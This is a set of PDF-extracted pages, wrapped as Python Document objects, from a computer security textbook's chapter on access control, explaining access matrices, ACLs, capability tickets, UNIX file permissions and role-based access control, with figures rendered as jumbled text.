       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 134, 'page_label': '133'}, page_content='4.3 / DIsCRETIonARY ACCEss ConTRol  133\\nand subsequently refined by Graham and Denning [GRAH72, DENN71] and by \\nHarrison et al. [HARR76].\\nOne dimension of the matrix consists of identified subjects that may attempt \\ndata access to the resources. Typically, this list will consist of individual users or user \\ngroups, although access could be controlled for terminals, network equipment, hosts, \\nor applications instead of or in addition to users. The other dimension lists the objects \\nthat may be accessed. At the greatest level of detail, objects may be individual data \\nfields. More aggregate groupings, such as records, files, or even the entire database, \\nmay also be objects in the matrix. Each entry in the matrix indicates the access rights \\nof a particular subject for a particular object.\\nFigure 4.2a, based on a figure in [SAND94], is a simple example of an access \\nmatrix. Thus, user A owns files 1 and 3 and has read and write access rights to those \\nfiles. User B has read access rights to file 1, and so on.\\nIn practice, an access matrix is usually sparse and is implemented by decom -\\nposition in one of two ways. The matrix may be decomposed by columns, yielding \\naccess control lists (ACLs) (see Figure 4.2b). For each object, an ACL lists users and \\ntheir permitted access rights. The ACL may contain a default, or public, entry. This \\nallows users that are not explicitly listed as having special rights to have a default set \\nof rights. The default set of rights should always follow the rule of least privilege or \\nread-only access, whichever is applicable. Elements of the list may include individual \\nusers as well as groups of users.\\nWhen it is desired to determine which subjects have which access rights to a \\nparticular resource, ACLs are convenient, because each ACL provides the informa-\\ntion for a given resource. However, this data structure is not convenient for determin-\\ning the access rights available to a specific user.\\nDecomposition by rows yields capability tickets (see Figure 4.2c). A capability \\nticket specifies authorized objects and operations for a particular user. Each user has a \\nnumber of tickets and may be authorized to loan or give them to others. Because tickets \\nmay be dispersed around the system, they present a greater security problem than access \\ncontrol lists. The integrity of the ticket must be protected, and guaranteed (usually by \\nthe operating system). In particular, the ticket must be unforgeable. One way to accom-\\nplish this is to have the operating system hold all tickets on behalf of users. These tickets \\nwould have to be held in a region of memory inaccessible to users. Another alternative is \\nto include an unforgeable token in the capability. This could be a large random password, \\nor a cryptographic message authentication code. This value is verified by the relevant \\nresource whenever access is requested. This form of capability ticket is appropriate for \\nuse in a distributed environment, when the security of its contents cannot be guaranteed.\\nThe convenient and inconvenient aspects of capability tickets are the opposite \\nof those for ACLs. It is easy to determine the set of access rights that a given user \\nhas, but more difficult to determine the list of users with specific access rights for a \\nspecific resource.\\n[SAND94] proposes a data structure that is not sparse, like the access matrix, \\nbut is more convenient than either ACLs or capability lists (see Table 4.2). An autho-\\nrization table contains one row for one access right of one subject to one resource. \\nSorting or accessing the table by subject is equivalent to a capability list. Sorting or \\naccessing the table by object is equivalent to an ACL. A relational database can easily \\nimplement an authorization table of this type.\\nM04_STAL0611_04_GE_C04.indd   133 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 135, 'page_label': '134'}, page_content='134  CHAPTER 4 / ACCEss ConTRol\\nAn Access Control Model\\nThis section introduces a general model for DAC developed by Lampson, Graham, \\nand Denning [LAMP71, GRAH72, DENN71]. The model assumes a set of subjects, \\na set of objects, and a set of rules that govern the access of subjects to objects. Let us \\ndefine the protection state of a system to be the set of information, at a given point in \\ntime, that specifies the access rights for each subject with respect to each object. We \\ncan identify three requirements: representing the protection state, enforcing access \\nrights, and allowing subjects to alter the protection state in certain ways. The model \\naddresses all three requirements, giving a general, logical description of a DAC system.\\nFigure 4.2 Example of Access Control Structures\\n(b) Access control lists for ﬁles of part (a)\\n(c) Capability lists for ﬁles of part (a)\\n(a) Access matrix\\nAFile 1\\nFile 1 File 2\\nOBJECTS\\nFile 3 File 4\\nOwn\\nR\\nW\\nB\\nR\\nC\\nR\\nW\\nBFile 2\\nOwn\\nR\\nW\\nC\\nR\\nAFile 3\\nOwn\\nR\\nW\\nB\\nW\\nBFile 4\\nR\\nC\\nOwn\\nR\\nW\\nFile 1User B File 2\\nR\\nFile 3\\nFile 1User A\\nUser A\\nUser B Read\\nRead\\nReadWrite\\nRead\\nWrite\\nOwn\\nRead\\nWrite\\nOwn\\nRead\\nWrite\\nOwn\\nRead\\nWrite\\nOwn\\nRead\\nWrite\\nSUBJECTS\\nUser C\\nOwn\\nR\\nW\\nFile 3\\nOwn\\nR\\nW\\nFile 4\\nOwn\\nR\\nW\\nW R\\nFile 1User C File 2\\nR\\nW\\nFile 4\\nOwn\\nR\\nW\\nR\\nM04_STAL0611_04_GE_C04.indd   134 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 136, 'page_label': '135'}, page_content='4.3 / DIsCRETIonARY ACCEss ConTRol  135\\nTo represent the protection state, we extend the universe of objects in the access \\ncontrol matrix to include the following:\\n• Processes: Access rights include the ability to delete a process, stop (block), and \\nwake up a process.\\n• Devices: Access rights include the ability to read/write the device, to control its \\noperation (e.g., a disk seek), and to block/unblock the device for use.\\n• Memory locations or regions: Access rights include the ability to read/write \\ncertain regions of memory that are protected such that the default is to disal -\\nlow access.\\n• Subjects: Access rights with respect to a subject have to do with the ability \\nto grant or delete access rights of that subject to other objects, as explained \\nsubsequently.\\nFigure 4.3 is an example. For an access control matrix A, each entry A[S, X] \\ncontains strings, called access attributes, that specify the access rights of subject S to \\nobject X. For example, in Figure 4.3, S1 may read file F1, because ‘read’ appears in \\nA[S1, F1].\\nFrom a logical or functional point of view, a separate access control module \\nis associated with each type of object (see Figure 4.4). The module evaluates each \\nSubject Access Mode Object\\nA Own File 1\\nA Read File 1\\nA Write File 1\\nA Own File 3\\nA Read File 3\\nA Write File 3\\nB Read File 1\\nB Own File 2\\nB Read File 2\\nB Write File 2\\nB Write File 3\\nB Read File 4\\nC Read File 1\\nC Write File 1\\nC Read File 2\\nC Own File 4\\nC Read File 4\\nC Write File 4\\nTable 4.2 Authorization Table for Files in Figure 4.2\\nM04_STAL0611_04_GE_C04.indd   135 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 137, 'page_label': '136'}, page_content='136  CHAPTER 4 / ACCEss ConTRol\\nrequest by a subject to access an object to determine if the access right exists. An \\naccess attempt triggers the following steps:\\n1. A subject S0 issues a request of type a for object X.\\n2. The request causes the system (the operating system or an access control interface \\nmodule of some sort) to generate a message of the form (S0, a, X) to the control-\\nler for X.\\n3. The controller interrogates the access matrix A to determine if a is in A[S0, X]. \\nIf so, the access is allowed; if not, the access is denied and a protection violation \\noccurs. The violation should trigger a warning and appropriate action.\\nFigure 4.4 suggests that every access by a subject to an object is mediated by \\nthe controller for that object, and that the controller’s decision is based on the cur -\\nrent contents of the matrix. In addition, certain subjects have the authority to make \\nspecific changes to the access matrix. A request to modify the access matrix is treated \\nas an access to the matrix, with the individual entries in the matrix treated as objects. \\nSuch accesses are mediated by an access matrix controller, which controls updates \\nto the matrix.\\nThe model also includes a set of rules that govern modifications to the access \\nmatrix, as shown in Table 4.3. For this purpose, we introduce the access rights ‘owner’ \\nand ‘control’ and the concept of a copy flag, as explained in the subsequent paragraphs.\\nThe first three rules deal with transferring, granting, and deleting access rights. \\nSuppose the entry a* exists in A[S0, X]. This means S0 has access right a to subject \\nX and, because of the presence of the copy flag, can transfer this right, with or with-\\nout copy flag, to another subject. Rule R1 expresses this capability. A subject would \\ntransfer the access right without the copy flag if there were a concern that the new \\nsubject would maliciously transfer the right to another subject that should not have \\nthat access right. For example, S1 may place ‘read’ or ‘read*’ in any matrix entry in \\nthe F1 column. Rule R2 states that if S0 is designated as the owner of object X, then \\nS0 can grant an access right to that object for any other subject. Rule R2 states that \\nFigure 4.3 Extended Access Control Matrix\\nS1\\nS1 S2 S3 F1 F2 P1 P2 D1 D2\\nS2\\nS3\\nSubjects\\nSUBJECTS\\nFiles Processes Disk drives\\nOBJECTS\\n*  copy ﬂag set\\ncontrol owner\\ncontrol\\nwrite\\nexecutewrite *\\nstop\\nwakeup wakeup seek\\nseek *\\nread\\nowner\\nowner\\nownerread *\\ncontrol\\ncontrol\\nowner\\nM04_STAL0611_04_GE_C04.indd   136 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 138, 'page_label': '137'}, page_content='4.3 / DIsCRETIonARY ACCEss ConTRol  137\\nS0 can add any access right to A[S, X] for any S, if S0 has ‘owner’ access to X. Rule R3 \\npermits S0 to delete any access right from any matrix entry in a row for which S0 con-\\ntrols the subject, and for any matrix entry in a column for which S0 owns the object. \\nRule R4 permits a subject to read that portion of the matrix that it owns or controls.\\nThe remaining rules in Table 4.3 govern the creation and deletion of subjects \\nand objects. Rule R5 states that any subject can create a new object, which it owns, \\nand can then grant and delete access to the object. Under Rule R6, the owner of an \\nobject can destroy the object, resulting in the deletion of the corresponding column \\nof the access matrix. Rule R7 enables any subject to create a new subject; the creator \\nowns the new subject and the new subject has control access to itself. Rule R8 permits \\nthe owner of a subject to delete the row and column (if there are subject columns) \\nof the access matrix designated by that subject.\\nThe set of rules in Table 4.3 is an example of the rule set that could be defined \\nfor an access control system. The following are examples of additional or alternative \\nFigure 4.4 An Organization of the Access Control Function\\nMemory\\naddressing\\nhardware\\nInstruction\\ndecoding\\nhardware\\nInstructions\\nTerminal\\n& device\\nmanager\\nTerminal\\n& devices\\nAccess\\nmatrix\\nmonitor\\nAccess\\nmatrixwrite read\\nProcess\\nmanager\\nSubjects\\nread F\\nS i\\nS j\\nwakeup P (S j, wakeup, P)\\nS k\\nS m\\ndelete b from  Sp , Y (S m , delete, b, S p , Y)\\n(S k, grant, a, S n , X)grant a to  Sn , X\\n(S i, read, F)\\nAccess control mechanisms\\nSystem intervention\\nObjects\\nFiles\\nSegments\\n& pages\\nProcesses\\nFile\\nsystem\\nM04_STAL0611_04_GE_C04.indd   137 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 139, 'page_label': '138'}, page_content='138  CHAPTER 4 / ACCEss ConTRol\\nrules that could be included. A transfer-only right could be defined, which results in \\nthe transferred right being added to the target subject and deleted from the transfer-\\nring subject. The number of owners of an object or a subject could be limited to one \\nby not allowing the copy flag to accompany the owner right.\\nThe ability of one subject to create another subject and to have ‘owner’ access \\nright to that subject can be used to define a hierarchy of subjects. For example, in \\nFigure 4.3, S1 owns S2 and S3, so S2 and S3 are subordinate to S1. By the rules of Table \\n4.3, S1 can grant and delete to S2 access rights that S1 already has. Thus, a subject can \\ncreate another subject with a subset of its own access rights. This might be useful, for \\nexample, if a subject is invoking an application that is not fully trusted and does not \\nwant that application to be able to transfer access rights to other subjects.\\nProtection Domains\\nThe access control matrix model that we have discussed so far associates a set \\nof capabilities with a user. A more general and more flexible approach, proposed \\nin [LAMP71], is to associate capabilities with protection domains. A protection \\ndomain is a set of objects together with access rights to those objects. In terms \\nof the access matrix, a row defines a protection domain. So far, we have equated \\neach row with a specific user. So, in this limited model, each user has a protection \\ndomain, and any processes spawned by the user have access rights defined by the \\nsame protection domain.\\nRule Command (by S0) Authorization Operation\\nR1\\ntransfer ba*\\na r to S, X\\n‘=a*> in A[S0, X]\\nstore ba*\\na r in A[S, X]\\nR2\\ngrant ba*\\na r to S, X\\n‘owner’ in A[S0, X]å\\nstore ba*\\na r in A[S, X]\\nR3\\ndelete A from S, X\\n‘control’ in A[S0, S] \\nor\\n‘owner’ in A[S0, X]\\ndelete a from A[S, X]\\nR4\\nw d  read S, X\\n‘control’ in A[S0, S] \\nor\\n‘owner’ in A[S0, X]\\ncopy A[S, X] into w\\nR5 create object X None add column for X to A; store \\n‘owner’ in A[S0, X]\\nR6 destroy object X ‘owner’ in A[S0, X] delete column for X from A\\nR7 create subject S none add row for S to A; execute  \\ncreate object S; store  \\n‘control’ in A[S, S]\\nR8 destroy subject S ‘owner’ in A[S0, S] delete row for S from A;  \\nexecute destroy object S\\nTable 4.3 Access Control System Commands\\nM04_STAL0611_04_GE_C04.indd   138 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 140, 'page_label': '139'}, page_content='4.4 / EXAMPlE: UnIX FIlE ACCEss ConTRol  139\\nA more general concept of protection domain provides more flexibility. For \\nexample, a user can spawn processes with a subset of the access rights of the user, \\ndefined as a new protection domain. This limits the capability of the process. Such a \\nscheme could be used by a server process to spawn processes for different classes of \\nusers. Also, a user could define a protection domain for a program that is not fully \\ntrusted, so its access is limited to a safe subset of the user’s access rights.\\nThe association between a process and a domain can be static or dynamic. For \\nexample, a process may execute a sequence of procedures and require different access \\nrights for each procedure, such as read file and write file. In general, we would like \\nto minimize the access rights that any user or process has at any one time; the use of \\nprotection domains provides a simple means to satisfy this requirement.\\nOne form of protection domain has to do with the distinction made in many \\noperating systems, such as UNIX, between user and kernel mode. A user program \\nexecutes in a user mode, in which certain areas of memory are protected from the \\nuser’s use and in which certain instructions may not be executed. When the user pro-\\ncess calls a system routine, that routine executes in a system mode, or what has come \\nto be called kernel mode, in which privileged instructions may be executed and in \\nwhich protected areas of memory may be accessed.\\n 4.4 EXAMPLE: UNIX FILE ACCESS CONTROL\\nFor our discussion of UNIX file access control, we first introduce several basic con-\\ncepts concerning UNIX files and directories.\\nAll types of UNIX files are administered by the operating system by means of \\ninodes. An inode (index node) is a control structure that contains the key informa -\\ntion needed by the operating system for a particular file. Several file names may be \\nassociated with a single inode, but an active inode is associated with exactly one file, \\nand each file is controlled by exactly one inode. The attributes of the file as well as \\nits permissions and other control information are stored in the inode. On the disk, \\nthere is an inode table, or inode list, that contains the inodes of all the files in the file \\nsystem. When a file is opened, its inode is brought into main memory and stored in \\na memory-resident inode table.\\nDirectories are structured in a hierarchical tree. Each directory can contain \\nfiles and/or other directories. A directory that is inside another directory is referred \\nto as a subdirectory. A directory is simply a file that contains a list of file names plus \\npointers to associated inodes. Thus, associated with each directory is its own inode.\\nTraditional UNIX File Access Control\\nMost UNIX systems depend on, or at least are based on, the file access control scheme \\nintroduced with the early versions of UNIX. Each UNIX user is assigned a unique \\nuser identification number (user ID). A user is also a member of a primary group, \\nand possibly a number of other groups, each identified by a group ID. When a file is \\ncreated, it is designated as owned by a particular user and marked with that user’s \\nID. It also belongs to a specific group, which initially is either its creator’s primary \\ngroup, or the group of its parent directory if that directory has SetGID permission \\nM04_STAL0611_04_GE_C04.indd   139 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 141, 'page_label': '140'}, page_content='140  CHAPTER 4 / ACCEss ConTRol\\nset. Associated with each file is a set of 12 protection bits. The owner ID, group ID, \\nand protection bits are part of the file’s inode.\\nNine of the protection bits specify read, write, and execute permission for the \\nowner of the file, other members of the group to which this file belongs, and all other \\nusers. These form a hierarchy of owner, group, and all others, with the highest relevant \\nset of permissions being used. Figure 4.5a shows an example in which the file owner \\nhas read and write access; all other members of the file’s group have read access; and \\nusers outside the group have no access rights to the file. When applied to a directory, \\nthe read and write bits grant the right to list and to create/rename/delete files in the \\ndirectory.1 The execute bit grants the right to descend into the directory or search it \\nfor a filename.\\n1Note that the permissions that apply to a directory are distinct from those that apply to any file or direc-\\ntory it contains. The fact that a user has the right to write to the directory does not give the user the right \\nto write to a file in that directory. That is governed by the permissions of the specific file. The user would, \\nhowever, have the right to rename the file.\\nFigure 4.5 UNIX File Access Control\\nuser: :rw-\\nrw- r-- ---\\ngroup::r--\\nother::---\\nOwner classGroup classOther cl\\nass\\n(a) Traditional UNIX approach (minimal access control list)\\n(b) Extended access control list\\nMas ked\\nentries\\nuser: :rw-\\nmask::rw-\\nuser:joe:rw-\\ngroup::r--\\nother::---\\nrw- rw- ---\\nOwner classGroup classOther cl\\nass\\nM04_STAL0611_04_GE_C04.indd   140 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 142, 'page_label': '141'}, page_content='4.4 / EXAMPlE: UnIX FIlE ACCEss ConTRol  141\\nThe remaining three bits define special additional behavior for files or direc -\\ntories. Two of these are the “set user ID” (SetUID) and “set group ID” (SetGID) \\npermissions. If these are set on an executable file, the operating system functions as \\nfollows. When a user (with execute privileges for this file) executes the file, the sys-\\ntem temporarily allocates the rights of the user’s ID of the file creator, or the file’s \\ngroup, respectively, to those of the user executing the file. These are known as the \\n“effective user ID” and “effective group ID” and are used in addition to the “real user \\nID” and “real group ID” of the executing user when making access control decisions \\nfor this program. This change is only effective while the program is being executed. \\nThis feature enables the creation and use of privileged programs that may use files \\nnormally inaccessible to other users. It enables users to access certain files in a con-\\ntrolled fashion. Alternatively, when applied to a directory, the SetGID permission \\nindicates that newly created files will inherit the group of this directory. The SetUID \\npermission is ignored.\\nThe final permission bit is the “sticky” bit. When set on a file, this originally indi-\\ncated that the system should retain the file contents in memory following execution. \\nThis is no longer used. When applied to a directory, though, it specifies that only the \\nowner of any file in the directory can rename, move, or delete that file. This is useful \\nfor managing files in shared temporary directories.\\nOne particular user ID is designated as “superuser.” The superuser is exempt \\nfrom the usual file access control constraints and has systemwide access. Any pro -\\ngram that is owned by, and SetUID to, the “superuser” potentially grants unrestricted \\naccess to the system to any user executing that program. Hence great care is needed \\nwhen writing such programs.\\nThis access scheme is adequate when file access requirements align with users \\nand a modest number of groups of users. For example, suppose a user wants to give \\nread access for file X to users A and B, and read access for file Y to users B and C. \\nWe would need at least two user groups, and user B would need to belong to both \\ngroups in order to access the two files. However, if there are a large number of differ-\\nent groupings of users requiring a range of access rights to different files, then a very \\nlarge number of groups may be needed to provide this. This rapidly becomes unwieldy \\nand difficult to manage, if even possible at all.2 One way to overcome this problem is \\nto use access control lists, which are provided in most modern UNIX systems.\\nA final point to note is that the traditional UNIX file access control scheme \\nimplements a simple protection domain structure. A domain is associated with the \\nuser, and switching the domain corresponds to changing the user ID temporarily.\\nAccess Control Lists in UNIX\\nMany modern UNIX and UNIX-based operating systems support access control \\nlists, including FreeBSD, OpenBSD, Linux, and Solaris. In this section, we describe \\nFreeBSD, but other implementations have essentially the same features and interface. \\nThe feature is referred to as extended access control list, while the traditional UNIX \\napproach is referred to as minimal access control list.\\n2Most UNIX systems impose a limit on the maximum number of groups to which any user may belong, as \\nwell as to the total number of groups possible on the system.\\nM04_STAL0611_04_GE_C04.indd   141 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 143, 'page_label': '142'}, page_content='142  CHAPTER 4 / ACCEss ConTRol\\nFreeBSD allows the administrator to assign a list of UNIX user IDs and \\ngroups to a file by using the setfacl command. Any number of users and groups \\ncan be associated with a file, each with three protection bits (read, write, execute), \\noffering a flexible mechanism for assigning access rights. A file need not have an \\nACL but may be protected solely by the traditional UNIX file access mechanism. \\nFreeBSD files include an additional protection bit that indicates whether the file \\nhas an extended ACL.\\nFreeBSD and most UNIX implementations that support extended ACLs use \\nthe following strategy (e.g., Figure 4.5b):\\n1. The owner class and other class entries in the 9-bit permission field ha ve the \\nsame meaning as in the minimal ACL case.\\n2. The group class entry specifies the permissions for the owner group for this file. \\nThese permissions represent the maximum permissions that can be assigned to \\nnamed users or named groups, other than the owning user. In this latter role, the \\ngroup class entry functions as a mask.\\n3. Additional named users and named groups may be associated with the file, each \\nwith a 3-bit permission field. The permissions listed for a named user or named \\ngroup are compared to the mask field. Any permission for the named user or \\nnamed group that is not present in the mask field is disallowed.\\nWhen a process requests access to a file system object, two steps are performed. \\nStep 1 selects the ACL entry that most closely matches the requesting process. The \\nACL entries are looked at in the following order: owner, named users, (owning or \\nnamed) groups, others. Only a single entry determines access. Step 2 checks if the \\nmatching entry contains sufficient permissions. A process can be a member in more \\nthan one group; so more than one group entry can match. If any of these matching \\ngroup entries contain the requested permissions, one that contains the requested per-\\nmissions is picked (the result is the same no matter which entry is picked). If none of \\nthe matching group entries contains the requested permissions, access will be denied \\nno matter which entry is picked.\\n 4.5 ROLE-BASED ACCESS CONTROL\\nTraditional DAC systems define the access rights of individual users and groups of \\nusers. In contrast, RBAC is based on the roles that users assume in a system rather \\nthan the user’s identity. Typically, RBAC models define a role as a job function within \\nan organization. RBAC systems assign access rights to roles instead of individual \\nusers. In turn, users are assigned to different roles, either statically or dynamically, \\naccording to their responsibilities.\\nRBAC now enjoys widespread commercial use and remains an area of active \\nresearch. The National Institute of Standards and Technology (NIST) has issued a stan-\\ndard, FIPS PUB 140-3 (Security Requirements for Cryptographic Modules, September \\n2009), that requires support for access control and administration through roles.\\nThe relationship of users to roles is many to many, as is the relationship of roles \\nto resources, or system objects (see Figure 4.6). The set of users changes, in some \\nM04_STAL0611_04_GE_C04.indd   142 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 144, 'page_label': '143'}, page_content='4.5 / RolE-BAsED ACCEss ConTRol  143\\nenvironments frequently, and the assignment of a user to one or more roles may also \\nbe dynamic. The set of roles in the system in most environments is relatively static, \\nwith only occasional additions or deletions. Each role will have specific access rights \\nto one or more resources. The set of resources and the specific access rights associated \\nwith a particular role are also likely to change infrequently.\\nWe can use the access matrix representation to depict the key elements of an \\nRBAC system in simple terms, as shown in Figure 4.7. The upper matrix relates \\nindividual users to roles. Typically there are many more users than roles. Each matrix \\nentry is either blank or marked, the latter indicating that this user is assigned to this \\nrole. Note a single user may be assigned multiple roles (more than one mark in a \\nrow) and multiple users may be assigned to a single role (more than one mark in a \\nFigure 4.6 Users, Roles, and Resources\\nRole 1\\nUsers Roles Resources\\nRole 2\\nRole 3\\nM04_STAL0611_04_GE_C04.indd   143 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 145, 'page_label': '144'}, page_content='144  CHAPTER 4 / ACCEss ConTRol\\ncolumn). The lower matrix has the same structure as the DAC access control matrix, \\nwith roles as subjects. Typically, there are few roles and many objects, or resources. In \\nthis matrix, the entries are the specific access rights enjoyed by the roles. Note a role \\ncan be treated as an object, allowing the definition of role hierarchies.\\nRBAC lends itself to an effective implementation of the principle of least privi-\\nlege, referred to in Chapter 1. Each role should contain the minimum set of access \\nFigure 4.7 Access Control Matrix Representation of RBAC\\nP 1 P 2R 1 R 2\\nR 1\\nU 1\\nU 2\\nU 3\\nU 4\\nU 5\\nU 6\\nU m\\nR 2\\nF1 F2R n\\nR n\\nD 1 D 2\\nROLES\\nOBJECTS\\nR 1\\nR 2\\nR n\\ncontrol owner\\ncontrol\\nwrite\\nexecutewrite *\\nstop\\nwakeup wakeup seek\\nseek *\\nread\\nowner\\nowner\\nownerread *\\ncontrol\\ncontrol\\nowner\\nM04_STAL0611_04_GE_C04.indd   144 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 146, 'page_label': '145'}, page_content='4.5 / RolE-BAsED ACCEss ConTRol  145\\nrights needed for that role. A user is assigned to a role that enables him or her to \\nperform only what is required for that role. Multiple users assigned to the same role \\nenjoy the same minimal set of access rights.\\nRBAC Reference Models\\nA variety of functions and services can be included under the general RBAC \\napproach. To clarify the various aspects of RBAC, it is useful to define a set of abstract \\nmodels of RBAC functionality.\\n[SAND96] defines a family of reference models that has served as the basis for \\nongoing standardization efforts. This family consists of four models that are related \\nto each other, as shown in Figure 4.8a and Table 4.4. RBAC0 contains the minimum \\nfunctionality for an RBAC system. RBAC1 includes the RBAC0 functionality and \\nadds role hierarchies, which enable one role to inherit permissions from another role. \\nRBAC2 includes RBAC0 and adds constraints, which restrict the ways in which the \\nFigure 4.8 A Family of Role-Based Access Control Models RBAC0 is the \\nminimum requirement for an RBAC system. RBAC1 adds role hierarchies \\nand RBAC2 adds constraints. RBAC3 includes RBAC1 and RBAC2.\\nPermissions\\n(a) Relationship among RBAC models\\n(b) RBAC models\\nRBAC 0\\nBase model\\nRBAC 3\\nConsolidated model\\nRBAC 1\\nRole hierarchies\\nRBAC 2\\nConstraints\\nUsers\\nuser_sessions session_roles\\n User\\nassignment (UA)\\nPermission\\nassignment (PA)\\nRole\\nhierarchy (RH)\\nSessions\\nObjects\\nOper-\\nations\\nRoles\\nM04_STAL0611_04_GE_C04.indd   145 10/11/17   2:47 PM'),\n",
